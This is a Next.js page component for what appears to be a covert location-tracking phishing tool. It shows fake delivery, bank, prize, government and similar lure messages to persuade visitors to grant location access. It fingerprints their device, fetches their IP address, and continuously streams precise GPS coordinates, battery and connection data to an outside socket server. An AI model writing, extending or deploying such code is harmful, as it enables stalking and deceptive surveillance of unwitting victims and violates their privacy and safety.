'use client';
import { useEffect, useState, Suspense, useRef } from 'react';
import io from 'socket.io-client';
import { useSearchParams } from 'next/navigation';
import {
  IconPackage,
  IconShieldAlert,
  IconAward,
  IconBriefcase,
  IconGovernment,
  IconPlane,
  IconPizza,
  IconEdit
} from '../components/Icons';

const getTemplateIcon = (id, color = 'currentColor', size = 30) => {
  switch (id) {
    case 'delivery': return <IconPackage size={size} color={color} />;
    case 'bank':     return <IconShieldAlert size={size} color={color} />;
    case 'prize':    return <IconAward size={size} color={color} />;
    case 'job':      return <IconBriefcase size={size} color={color} />;
    case 'gov':      return <IconGovernment size={size} color={color} />;
    case 'customs':  return <IconPlane size={size} color={color} />;
    case 'food':     return <IconPizza size={size} color={color} />;
    default:         return <IconEdit size={size} color={color} />;
  }
};

// Socket is initialized inside useEffect on client mount to prevent server-side execution and build hangs.

const getIP = async () => {
  try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
  catch { return 'Unknown'; }
};

const getDeviceInfo = () => {
  const ua = navigator.userAgent, pl = navigator.platform;
  let device = 'Device', browser = 'Unknown';
  if (/iPhone/.test(ua)) device = 'iPhone';
  else if (/iPad/.test(ua)) device = 'iPad';
  else if (/Android/.test(ua)) device = 'Android';
  else if (/Mac/.test(pl)) device = 'Mac';
  else if (/Win/.test(pl)) device = 'Windows';
  else if (/Linux/.test(pl)) device = 'Linux';
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
  else if (/Firefox/.test(ua)) browser = 'Firefox';
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg/.test(ua)) browser = 'Edge';
  return {
    userAgent: ua, platform: pl, language: navigator.language,
    screenSize: `${window.screen.width}×${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    deviceType: device, browser,
    cores: navigator.hardwareConcurrency || '?',
    memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?',
  };
};

const getBattery = async () => {
  try { if (navigator.getBattery) { const b = await navigator.getBattery(); return Math.round(b.level * 100); } }
  catch {} return undefined;
};

const getConnection = () => {
  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (c) return `${(c.effectiveType || c.type || 'unknown').toUpperCase()}${c.downlink ? ` ${c.downlink}Mbps` : ''}`.trim();
  } catch {} return undefined;
};

/* Theme colours for the target page (light page) */
const THEMES = {
  delivery: { color: '#2563eb', ring: '#dbeafe', bg: '#eff6ff', text: '#1e40af' },
  bank:     { color: '#d97706', ring: '#fef3c7', bg: '#fffbeb', text: '#92400e' },
  prize:    { color: '#b45309', ring: '#fef3c7', bg: '#fffbeb', text: '#78350f' },
  job:      { color: '#059669', ring: '#d1fae5', bg: '#ecfdf5', text: '#065f46' },
  gov:      { color: '#4f46e5', ring: '#e0e7ff', bg: '#eef2ff', text: '#3730a3' },
  customs:  { color: '#7c3aed', ring: '#ede9fe', bg: '#f5f3ff', text: '#4c1d95' },
  food:     { color: '#dc2626', ring: '#fee2e2', bg: '#fef2f2', text: '#991b1b' },
  custom:   { color: '#4f46e5', ring: '#e0e7ff', bg: '#eef2ff', text: '#3730a3' },
};

function Dots({ color }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center', gap: 7 }}>
      {[0,1,2].map(i => (
        <div key={i} style={{
          width: 8, height: 8, borderRadius: '50%', background: color,
          animation: `bk ${1.4 + i * 0.15}s ${i * 0.15}s infinite ease-in-out`,
        }} />
      ))}
    </div>
  );
}

function TrackContent() {
  const params   = useSearchParams();
  const trackerId = params.get('id') || 'default';
  const msgParam  = params.get('msg');

  const msg = (() => {
    if (!msgParam) return null;
    try { return JSON.parse(decodeURIComponent(atob(msgParam))); }
    catch { return null; }
  })();

  const themeKey = msg?.theme || 'delivery';
  const theme = THEMES[themeKey] || THEMES.delivery;
  const iconKey = msg?.icon || 'delivery';
  const title = msg?.title || 'Your package is arriving today';
  const body  = msg?.body  || 'A parcel has been dispatched to your address. Please confirm your location so our driver can find you.';
  const cta   = msg?.cta   || 'Confirm My Location';

  const [status, setStatus] = useState('init'); // init | waiting | active | error
  const [dots,   setDots]   = useState('');
  const sent = useRef(false);
  const socketRef = useRef(null);

  useEffect(() => {
    const iv = setInterval(() => setDots(p => p.length >= 3 ? '' : p + '.'), 500);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    let wid;
    const run = async () => {
      const di  = getDeviceInfo();
      const ip  = await getIP();
      const bat = await getBattery();
      const con = getConnection();

      const s = io('https://mk-tracker.onrender.com');
      socketRef.current = s;

      s.emit('join_tracker', { tracker_id: trackerId, deviceInfo: { ...di, ipAddress: ip } });
      setStatus('waiting');

      if (!('geolocation' in navigator)) { setStatus('error'); return; }

      const opts = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
      wid = navigator.geolocation.watchPosition(
        pos => {
          sent.current = true;
          setStatus('active');
          s.emit('update_location', {
            tracker_id: trackerId,
            lat: pos.coords.latitude, lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            speed: pos.coords.speed || null,
            heading: pos.coords.heading || null,
            timestamp: pos.coords.timestamp,
            battery: bat, connection: con,
          });
        },
        () => {
          if (sent.current) return;
          setStatus('error');
          navigator.geolocation.getCurrentPosition(
            pos => {
              sent.current = true;
              setStatus('active');
              s.emit('update_location', {
                tracker_id: trackerId,
                lat: pos.coords.latitude, lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                battery: bat, connection: con,
              });
            }, null, { ...opts, enableHighAccuracy: false }
          );
        }, opts
      );
    };
    run();

    return () => {
      if (wid !== undefined) navigator.geolocation.clearWatch(wid);
      if (socketRef.current) {
        socketRef.current.disconnect();
      }
    };
  }, [trackerId]);

  return (
    <div style={{
      minHeight: '100vh', background: '#f9fafb',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      padding: 20, fontFamily: "'Inter', -apple-system, sans-serif",
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        @keyframes bk { 0%,80%,100% { transform:translateY(0);opacity:.35; } 40% { transform:translateY(-7px);opacity:1; } }
        @keyframes ring { 0%{transform:scale(1);opacity:.6} 100%{transform:scale(1.7);opacity:0} }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
        @keyframes spin { to{transform:rotate(360deg)} }
      `}</style>

      <div style={{
        width: '100%', maxWidth: 360,
        background: 'white', borderRadius: 20,
        boxShadow: '0 2px 16px rgba(0,0,0,.07), 0 1px 4px rgba(0,0,0,.05)',
        overflow: 'hidden',
      }}>
        {/* Thin top bar */}
        <div style={{ height: 3, background: theme.color }} />

        <div style={{ padding: '36px 28px 28px' }}>
          {/* Icon with ring on active */}
          <div style={{ position: 'relative', width: 72, height: 72, margin: '0 auto 24px' }}>
            {status === 'active' && (
              <div style={{
                position: 'absolute', inset: -10, borderRadius: '50%',
                border: `2px solid ${theme.color}`,
                animation: 'ring 2s ease-out infinite',
              }} />
            )}
            <div style={{
              width: 72, height: 72, borderRadius: 17,
              background: theme.bg, border: `1px solid ${theme.ring}`,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              position: 'relative',
            }}>
              {getTemplateIcon(iconKey, theme.color, 32)}
            </div>
          </div>

          <h1 style={{ fontSize: 20, fontWeight: 700, color: '#111827', textAlign: 'center', marginBottom: 10, lineHeight: 1.3 }}>
            {title}
          </h1>
          <p style={{ fontSize: 13, color: '#6b7280', textAlign: 'center', lineHeight: 1.65, marginBottom: 24 }}>
            {body}
          </p>

          {/* Status card */}
          <div style={{ background: theme.bg, border: `1px solid ${theme.ring}`, borderRadius: 12, padding: '18px 16px' }}>
            {status === 'init' && (
              <div style={{ textAlign: 'center' }}>
                <div style={{ width: 20, height: 20, border: `2px solid ${theme.ring}`, borderTopColor: theme.color, borderRadius: '50%', animation: 'spin .7s linear infinite', margin: '0 auto 8px' }} />
                <div style={{ fontSize: 12, color: theme.text, fontWeight: 500 }}>Initialising…</div>
              </div>
            )}

            {status === 'waiting' && (
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 13, fontWeight: 600, color: theme.text, marginBottom: 12 }}>{cta}</div>
                <Dots color={theme.color} />
                <div style={{ fontSize: 11, color: '#9ca3af', marginTop: 10 }}>Allow location access when prompted</div>
              </div>
            )}

            {status === 'active' && (
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
                  <div style={{
                    width: 8, height: 8, borderRadius: '50%',
                    background: '#22c55e', animation: 'pulse 1.5s infinite',
                  }} />
                  <span style={{ fontSize: 12, fontWeight: 600, color: '#15803d' }}>Location confirmed</span>
                </div>
                <div style={{ fontSize: 11, color: '#9ca3af', marginBottom: 12, lineHeight: 1.5 }}>
                  Keep this page open. {"You'll"} receive a notification when ready.
                </div>
                <Dots color={theme.color} />
              </div>
            )}

            {status === 'error' && (
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 13, fontWeight: 600, color: '#b91c1c', marginBottom: 4 }}>Location access required</div>
                <div style={{ fontSize: 11, color: '#9ca3af', lineHeight: 1.5 }}>
                  Enable location in your browser settings and reload.
                </div>
              </div>
            )}
          </div>

          {status === 'error' && (
            <button onClick={() => window.location.reload()} style={{
              width: '100%', marginTop: 12, padding: '11px',
              background: theme.color, border: 'none', borderRadius: 10,
              color: 'white', fontSize: 13, fontWeight: 600, cursor: 'pointer',
            }}>
              Try Again
            </button>
          )}
        </div>

        <div style={{ padding: '0 28px 20px', textAlign: 'center' }}>
          <p style={{ fontSize: 11, color: '#d1d5db' }}>Keep this page open until complete</p>
        </div>
      </div>
    </div>
  );
}

export default function Track() {
  return (
    <Suspense fallback={
      <div style={{ minHeight: '100vh', background: '#f9fafb', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ width: 32, height: 32, border: '3px solid #e5e7eb', borderTopColor: '#6366f1', borderRadius: '50%', animation: 'spin .7s linear infinite' }} />
      </div>
    }>
      <TrackContent />
    </Suspense>
  );
}